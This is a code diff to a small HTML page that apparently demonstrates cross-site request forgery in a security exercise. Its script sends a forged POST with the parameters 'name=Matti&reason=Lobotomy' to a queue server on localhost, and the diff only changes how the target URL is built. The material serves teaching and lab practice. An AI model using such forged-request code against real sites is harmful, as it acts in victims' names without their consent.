@@ -12,7 +12,7 @@
 			var url = document.getElementById('address').value;
 			var params = "name=Matti&reason=Lobotomy";
 			var xhr = new XMLHttpRequest();
-			xhr.open("POST", url, true);
+			xhr.open("POST", url+"/form", true);
 			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 			xhr.send(params);
 			document.getElementById('info').innerHTML = "Have a look back at the <a href='" + url + "/queue'> queue</a>. Nice, isn't it?";
@@ -29,7 +29,7 @@
 	<p> Let's pretend that you're Matti.</p>
 	<form id="csrf-form">
 		<label for="address">Server address:</label>
-		<input type="text" name="address" id="address" value="http://127.0.0.1:8080/form">
+		<input type="text" name="address" id="address" value="http://127.0.0.1:8080">
 		<button type="submit">Execute</button>
 	</form>
 	<p id="info"></span>
